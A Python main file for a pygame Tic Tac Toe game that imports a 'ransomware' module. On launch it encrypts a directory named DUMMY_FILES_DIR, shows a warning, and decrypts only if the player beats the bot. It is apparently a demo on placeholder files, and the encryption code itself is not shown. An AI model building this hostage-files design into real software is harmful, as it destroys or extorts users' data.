
from ui import *
from ransomware import *
from bot_logic import *
from game_logic import *

# Initialize the game
pygame.init()
pygame.display.set_caption("Tic Tac Toe")


def main():
    if not is_encrypted():
        encrypt_files(DUMMY_FILES_DIR)
        set_encryption_status("encrypted")

    show_warning()  # Display the encryption warning

    running = True
    player = "X"
    winner = None
    game_over = False
    games_counter = 0

    pygame.mixer.music.load("assets/background_music.mp3")
    pygame.mixer.music.play(-1)

    while running:
        draw_title()
        draw_grid()
        draw_symbols()

        if games_counter > 2:
            show_game_over()
            pygame.display.update()
            pygame.time.delay(5000)
            running = False

        if winner == "O" or is_draw() and games_counter <= 2:

            pygame.display.update()
            pygame.time.delay(1000)
            games_counter += 1
            show_end_of_round(games_counter)
            for i in range(len(GRID)):
                for j in range(len(GRID[i])):
                    GRID[i][j] = None

            winner = None
            game_over = False
            player = "X"

        if winner == "X" and is_encrypted():
            game_over = True
            decrypt_files(DUMMY_FILES_DIR)  # Decrypt files only if X wins
            set_encryption_status("decrypted")
            show_when_user_won()

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
            if event.type == pygame.MOUSEBUTTONDOWN and not game_over:
                x, y = event.pos
                col = (x - HORIZONTAL_OFFSET) // CELL_SIZE
                row = y // CELL_SIZE

                if GRID[row][col] is None:
                    GRID[row][col] = player
                    winner = check_winner()

                    if not winner and not is_draw():
                        # Pick the bot difficulty by commenting the other two
                        # bot = easy_bot
                        bot = medium_bot
                        # bot = hard_bot

                        bot_move = bot(GRID, "O", "X")
                        if bot_move:
                            GRID[bot_move[0]][bot_move[1]] = "O"
                            winner = check_winner()

        pygame.display.flip()

    pygame.quit()


if __name__ == "__main__":
    main()
